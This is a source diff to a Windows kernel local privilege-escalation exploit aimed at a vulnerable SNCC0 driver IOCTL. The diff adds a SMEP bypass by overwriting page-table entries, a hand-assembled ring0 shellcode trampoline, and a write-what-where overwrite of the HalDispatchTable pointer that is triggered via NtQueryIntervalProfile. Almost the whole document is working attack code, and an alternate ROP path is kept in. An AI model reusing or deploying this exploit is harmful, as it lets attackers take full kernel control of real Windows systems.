@@ -7,8 +7,13 @@
     mailto:cr4sh0@gmail.com
     http://blog.cr4.sh/
 */
-
 #include "stdafx.h"
+
+// make crt functions inline
+#pragma intrinsic(memcpy)
+
+// uncomment to use ROP for SMEP bypass
+/* #define USE_ROP */
 
 //
 // Constants for vulnerable driver
@@ -17,56 +22,83 @@
 #define EXPL_CONTROL_CODE   0x220010
 #define EXPL_DEVICE_PATH    SNCC0_DEVICE_PATH
 
+typedef struct _KERNEL_EXPL_CONTEXT
+{
+    // information about successful execution of _r0_proc_continue()
+    BOOL bExplOk;
+
+    // information caller specified ring0 payload
+    KERNEL_EXPL_HANDLER Handler;
+    PVOID HandlerContext;
+
+    // information about kernel environment
+    PHAL_DISPATCH HalDispatchTable;
+    func_ExAllocatePool f_ExAllocatePool;
+
+} KERNEL_EXPL_CONTEXT,
+*PKERNEL_EXPL_CONTEXT;
+
+static PVOID m_Rop_Mov_Cr4 = NULL;
+static KERNEL_EXPL_CONTEXT m_Context;
+
 extern "C"
 {
 void WINAPI GetCPUIDFeatureBits(DWORD EaxValue, PDWORD EcxValue, PDWORD EdxValue, PDWORD EbxValue);
+
+// functions used in ring0 shellcode
+void WINAPI _r0_proc_begin(PKERNEL_EXPL_CONTEXT pContext);
+void WINAPI _r0_proc_end(void);
+void WINAPI _r0_proc_continue(void);
 }
-
-static PHAL_DISPATCH m_HalDispatchTable = NULL;
-static func_ExAllocatePool f_ExAllocatePool = NULL;
-static PVOID m_Rop_Mov_Cr4 = NULL;
-static BOOL m_bExplOk = FALSE;
-
-// for caller-specified ring0 payload
-static KERNEL_EXPL_HANDLER m_Handler = NULL;
-static PVOID m_HandlerContext = NULL;
 //--------------------------------------------------------------------------------------
-void WINAPI _r0_proc_continue(void)
+void WINAPI _r0_proc_begin(PKERNEL_EXPL_CONTEXT pContext)
 {    
-    if (m_HalDispatchTable && f_ExAllocatePool)
-    {
 
 #if defined(_X86_)
 
 #define TEMP_CODE_LEN 8
 
-        char TempCode[] =
-            "\xB8\x01\x00\x00\xC0"  // mov      eax, 0xC00000001 
-            "\xC2\x1C\x00";         // retn     0x1C
+    char TempCode[] =
+    {
+        '\xB8', '\x01', '\x00', '\x00', '\xC0',  // mov      eax, 0xC00000001 
+        '\xC2', '\x1C', '\x00'                   // retn     0x1C
+    };
 
 #elif defined(_AMD64_)            
 
 #define TEMP_CODE_LEN 6
 
-        char TempCode[] =
-            "\xB8\x01\x00\x00\xC0"  // mov      eax, 0xC00000001 
-            "\xC3";                 // retn
+    char TempCode[] =
+    {
+        '\xB8', '\x01', '\x00', '\x00', '\xC0',  // mov      eax, 0xC00000001 
+        '\xC3'                                   // retn
+    };
+
 #endif
 
-        // allocate code buffer to restore HAL_DISPATCH::HalQuerySystemInformation pointer
-        if (m_HalDispatchTable->HalQuerySystemInformation = f_ExAllocatePool(NonPagedPool, TEMP_CODE_LEN))
-        {
-            memcpy(m_HalDispatchTable->HalQuerySystemInformation, TempCode, TEMP_CODE_LEN);
-        }
+    // allocate code buffer to restore HAL_DISPATCH::HalQuerySystemInformation pointer
+    if (pContext->HalDispatchTable->HalQuerySystemInformation = pContext->f_ExAllocatePool(NonPagedPool, TEMP_CODE_LEN))
+    {
+        memcpy(pContext->HalDispatchTable->HalQuerySystemInformation, TempCode, TEMP_CODE_LEN);
     }
 
-    if (m_Handler)
+    if (pContext->Handler)
     {
         // call external ring0 payload handler
-        m_Handler(m_HandlerContext);
+        pContext->Handler(pContext->HandlerContext);
     }
 
-    m_bExplOk = TRUE;    
+    pContext->bExplOk = TRUE;
+}
+//--------------------------------------------------------------------------------------
+void WINAPI _r0_proc_end(void)
+{
+    return;
+}
+//--------------------------------------------------------------------------------------
+void WINAPI _r0_proc_continue(void)
+{
+    _r0_proc_begin(&m_Context);
 }
 //--------------------------------------------------------------------------------------
 NTSTATUS WINAPI _r0_proc_HalQuerySystemInformation(
@@ -227,10 +259,11 @@ BOOL RopGadgetInit(void)
 //--------------------------------------------------------------------------------------
 BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
 {
-    BOOL bUseRop = FALSE;
+    BOOL bBypassSMEP = FALSE;
 
-    m_Handler = Handler;
-    m_HandlerContext = HandlerContext;
+    m_Context.bExplOk = FALSE;
+    m_Context.Handler = Handler;
+    m_Context.HandlerContext = HandlerContext;    
 
     OSVERSIONINFOA Version;
     Version.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
@@ -267,7 +300,7 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
                 (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 3) ||
                 (Version.dwMajorVersion == 10 && Version.dwMinorVersion == 0))
             {
-                bUseRop = TRUE;
+                bBypassSMEP = TRUE;
             }
         }
         else
@@ -283,29 +316,53 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
     }
 
     // get real address of nt!ExAllocatePool()
-    f_ExAllocatePool = (func_ExAllocatePool)KernelGetProcAddr("ExAllocatePool");
-    if (f_ExAllocatePool == NULL)
+    if ((m_Context.f_ExAllocatePool = (func_ExAllocatePool)KernelGetProcAddr("ExAllocatePool")) == NULL)
     {
         DbgMsg(__FILE__, __LINE__, "ERROR: Can't find address of nt!ExAllocatePool()\n");
         goto end;
     }
 
     // get real address of nt!HalDispatchTable
-    m_HalDispatchTable = (PHAL_DISPATCH)KernelGetProcAddr("HalDispatchTable");
-    if (m_HalDispatchTable == NULL)
+    if ((m_Context.HalDispatchTable = (PHAL_DISPATCH)KernelGetProcAddr("HalDispatchTable")) == NULL)
     {
         DbgMsg(__FILE__, __LINE__, "ERROR: Can't find address of nt!HalDispatchTable\n");
         goto end;
     }
 
-    DbgMsg(__FILE__, __LINE__, "nt!ExAllocatePool() is at "IFMT"\n", f_ExAllocatePool);
-    DbgMsg(__FILE__, __LINE__, "nt!HalDispatchTable is at "IFMT"\n", m_HalDispatchTable);
+    DbgMsg(__FILE__, __LINE__, "nt!ExAllocatePool() is at "IFMT"\n", m_Context.f_ExAllocatePool);
+    DbgMsg(__FILE__, __LINE__, "nt!HalDispatchTable is at "IFMT"\n", m_Context.HalDispatchTable);
 
     LARGE_INTEGER Val;
-    PVOID Trampoline = NULL;
+    PVOID Trampoline = NULL;    
 
-    if (bUseRop)
+#ifndef USE_ROP
+
+    /*
+        Use paging structures hack to bypass SMEP.
+
+        For more information check "Windows 8 Kernel Memory Protections Bypass" article by
+        MWR labs:
+
+        https://labs.mwrinfosecurity.com/blog/windows-8-kernel-memory-protections-bypass/
+    */
+
+    // special value that corresponds to isolated paging structures
+    DWORD64 TargetAddr = 0x100804020001;
+    DWORD64 TargetVal = 0x6300000000000000;
+
+    // determinate virtual addresses of necassary paging structures
+    DWORD64 PT = VA_to_PT(TargetAddr);
+    DWORD64 PD = VA_to_PD(TargetAddr);
+    DWORD64 PDPT = VA_to_PDPT(TargetAddr);
+    DWORD64 PML4 = VA_to_PML4(TargetAddr);
+
+#endif // USE_ROP
+
+    if (bBypassSMEP)
     {        
+
+#ifdef USE_ROP
+
         if (!RopGadgetInit())
         {
             goto end;
@@ -356,11 +413,89 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
 
         // RET ; return back to the nt!NtQueryntervalProfile()
         *(PUCHAR)((DWORD_PTR)Trampoline + 0x12) = 0xc3;
+
+#else // USE_ROP
+
+        PVOID Shellcode = &_r0_proc_begin;
+        DWORD dwShellcodeSize = (DWORD)((DWORD_PTR)&_r0_proc_end - (DWORD_PTR)&_r0_proc_begin);
+
+        DbgMsg(__FILE__, __LINE__, "Shellcode size is 0x%x bytes\n", dwShellcodeSize);
+
+        // check if our ring0 code fits into the single page
+        if (dwShellcodeSize > PAGE_SIZE - 0x100)
+        {
+            DbgMsg(__FILE__, __LINE__, "ERROR: Shellcode is too large\n");
+            goto end;
+        }
+
+        // allocate shellcode trampoline
+        if ((Trampoline = VirtualAlloc((PVOID)TargetAddr, PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL)
+        {
+            DbgMsg(__FILE__, __LINE__, "VirtualAlloc() ERROR %d\n", GetLastError());
+            goto end;
+        }
+
+        DbgMsg(__FILE__, __LINE__, "Shellcode is allocated at "IFMT"\n", Trampoline);
+
+        DWORD Ptr = 0, PtrAddr = 0;
+
+        // MOV RCX, m_Context
+        *(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xb948;
+        *(PDWORD_PTR)((DWORD_PTR)Trampoline + Ptr + sizeof(WORD)) = (DWORD_PTR)&m_Context;
+        Ptr += 10;
+
+        // MOV RAX, _r0_proc_begin
+        *(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xb848;
+        *(PDWORD_PTR)((DWORD_PTR)Trampoline + Ptr + sizeof(WORD)) = 0;
+
+        // remember offset of _r0_proc_begin() address
+        PtrAddr = Ptr;
+        Ptr += 10;
+
+        // SUB RSP, 08h ; restore proper stack pointer value
+        *(PDWORD)((DWORD_PTR)Trampoline + Ptr) = 0x08ec8348;
+        Ptr += 4;
+
+        // CALL RAX ; calls _r0_proc_begin()
+        *(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xd0ff;
+        Ptr += 2;
+
+        // ADD RSP, 08h ; restore proper stack pointer value
+        *(PDWORD)((DWORD_PTR)Trampoline + Ptr) = 0x08c48348;
+        Ptr += 4;
+
+        // MOV RAX, 0xC00000001
+        *(PWORD)((DWORD_PTR)Trampoline + Ptr) = 0xb848;
+        *(PDWORD_PTR)((DWORD_PTR)Trampoline + Ptr + sizeof(WORD)) = 0xC00000001;
+        Ptr += 10;
+
+        // RET ; return back to the nt!NtQueryntervalProfile()
+        *(PUCHAR)((DWORD_PTR)Trampoline + Ptr) = 0xc3;
+        Ptr += 1;
+
+        // set _r0_proc_begin() address
+        *(PDWORD_PTR)((DWORD_PTR)Trampoline + PtrAddr + sizeof(WORD)) = (DWORD_PTR)Trampoline + Ptr;        
+
+        memcpy(RVATOVA(Trampoline, Ptr), Shellcode, dwShellcodeSize);
+
+        if (m_Context.Handler)
+        {
+            // calculate offset of the handler from the beginning of the shellcode
+            DWORD dwHandlerOffset = (DWORD)((DWORD_PTR)m_Context.Handler - (DWORD_PTR)&_r0_proc_begin);
+
+            // switch handler to the copied code
+            m_Context.Handler = (KERNEL_EXPL_HANDLER)RVATOVA(Trampoline, Ptr + dwHandlerOffset);
+
+            DbgMsg(__FILE__, __LINE__, "Address of the ring0 payload handler is "IFMT"\n", m_Context.Handler);
+        }
+
+#endif // USE_ROP
+
     }
     else
     {
         Val.QuadPart = (DWORD64)&_r0_proc_HalQuerySystemInformation;
-    }
+    }    
 
     DbgMsg(__FILE__, __LINE__, "Opengin device \"%s\"...\n", EXPL_DEVICE_PATH);
 
@@ -372,18 +507,16 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
         goto end;
     }
 
-    DWORD ns = 0, dwCode = EXPL_CONTROL_CODE;
-
-    IO_STATUS_BLOCK StatusBlock;
-    ZeroMemory(&StatusBlock, sizeof(StatusBlock));
-
+    DWORD ns = 0;
     OBJECT_ATTRIBUTES ObjAttr;
-    ZeroMemory(&ObjAttr, sizeof(ObjAttr));
-
+    IO_STATUS_BLOCK StatusBlock;    
     UCHAR Buff[EXPL_BUFF_SIZE];
+
+    ZeroMemory(&ObjAttr, sizeof(ObjAttr));
+    ZeroMemory(&StatusBlock, sizeof(StatusBlock));        
     ZeroMemory(Buff, sizeof(Buff));
 
-    printf("Buff = "IFMT"\n", &Buff);
+    DbgMsg(__FILE__, __LINE__, "IRP user buffer address is "IFMT"\n", &Buff);
 
     GET_NATIVE(NtDeviceIoControlFile);
     GET_NATIVE(NtQueryIntervalProfile);
@@ -406,8 +539,8 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
 #ifdef _AMD64_
 
     /*
-        Fill IOCTL Input buffer with additional parameters values that 
-        will be processed in vulnerable IOCTL handler in following way:
+        We need to fill IOCTL input buffer with values that will be processed 
+        by vulnerable IOCTL handler in following way:
 
             where = *(_QWORD *)Buff
             what = *(_DWORD *)(Buff + 0x58)
@@ -424,19 +557,44 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
 
             ...
     */
-    *(PDWORD64)&Buff[0x00] = (DWORD64)m_HalDispatchTable - 0x10;
-    *(PDWORD)&Buff[0x58] = Val.LowPart;
     *(PDWORD)&Buff[0x5c] = 0;
 
-    /*
-        Call vulnreable driver and modify HAL_DISPATCH::HalQuerySystemInformation
-    */
-    SEND_IOCTL(dwCode, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));    
+    #define OVERWITE(_addr_, _val_)                                                                 \
+                                                                                                    \
+        Val.QuadPart = (DWORD64)(_val_);                                                            \
+                                                                                                    \
+        *(PDWORD)&Buff[0x58] = Val.LowPart;                                                         \
+        *(PDWORD64)&Buff[0x00] = (DWORD64)((PUCHAR)(_addr_) - 0x18);                                \
+                                                                                                    \
+        /* overwrite lower dword */                                                                 \
+        SEND_IOCTL(EXPL_CONTROL_CODE, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));      \
+                                                                                                    \
+        *(PDWORD)&Buff[0x58] = Val.HighPart;                                                        \
+        *(PDWORD64)&Buff[0x00] += sizeof(DWORD);                                                    \
+                                                                                                    \
+        /* overwrite higher dword */                                                                \
+        SEND_IOCTL(EXPL_CONTROL_CODE, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));
 
-    *(PDWORD64)&Buff[0x00] += sizeof(DWORD);
-    *(PDWORD)&Buff[0x58] = Val.HighPart;
+#ifndef USE_ROP    
 
-    SEND_IOCTL(dwCode, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));
+    if (bBypassSMEP)
+    {
+        // overwrite paging structures and make shellcode trampoline executable from kernel mode
+        OVERWITE(PT - 7, TargetVal);
+        OVERWITE(PD - 7, TargetVal);
+        OVERWITE(PDPT - 7, TargetVal);
+        OVERWITE(PML4 - 7, TargetVal);
+
+        // overwrite HAL_DISPATCH_TABLE function pointer with shellcode trampoline address
+        OVERWITE(&m_Context.HalDispatchTable->HalQuerySystemInformation, Trampoline);
+    }
+    else
+
+#endif // USE_ROP
+
+    {
+        OVERWITE(&m_Context.HalDispatchTable->HalQuerySystemInformation, Val.QuadPart);
+    }
 
 #else
 
@@ -444,10 +602,15 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
 
 #endif    
 
-    if (bUseRop)
+    // run current thread only on first CPU
+    SetThreadAffinityMask(GetCurrentThread(), 1);
+
+#ifdef USE_ROP
+
+    if (bBypassSMEP)
     {
         /*
-            Use SMEP bypass.
+            Use ROP for SMEP bypass.
         */
         DWORD FeaturesEcx = 0, FeaturesEdx = 0, FeaturesEbx = 0;
         DWORD ExtFeaturesEcx = 0, ExtFeaturesEdx = 0, ExtFeaturesEbx = 0;
@@ -565,10 +728,7 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
             Cr4Value |= CR4_PGE;
         }
 
-        DbgMsg(__FILE__, __LINE__, "New CR4 value is 0x%.8x\n", Cr4Value);
-
-        // run current thread only on first CPU
-        SetThreadAffinityMask(GetCurrentThread(), 1);
+        DbgMsg(__FILE__, __LINE__, "New CR4 value is 0x%.8x\n", Cr4Value);    
 
         /*
             NtQueryIntervalProfile() calls nt!KeQueryIntervalProfile(),
@@ -578,12 +738,15 @@ BOOL expl_SNCC0_Sys_220010(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)
         f_NtQueryIntervalProfile(Source, &Cr4Value);
     }
     else
-    {
-        /*
-            Don't use SMEP bypass for legacy systems.
-        */
+
+#endif // USE_ROP
+
+    {        
         DWORD Interval = 0;
 
+        /*
+            Don't use ROP, call shellcode directly.
+        */
         f_NtQueryIntervalProfile(ProfileTotalIssues, &Interval);
     }
 
@@ -599,7 +762,7 @@ end:
         CloseHandle(hDev);
     }
 
-    if (m_bExplOk)
+    if (m_Context.bExplOk)
     {
         DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Exploitation success\n");
     }
@@ -608,7 +771,7 @@ end:
         DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Exploitation fails\n");
     }
 
-    return m_bExplOk;
+    return m_Context.bExplOk;
 }
 //--------------------------------------------------------------------------------------
 // EoF
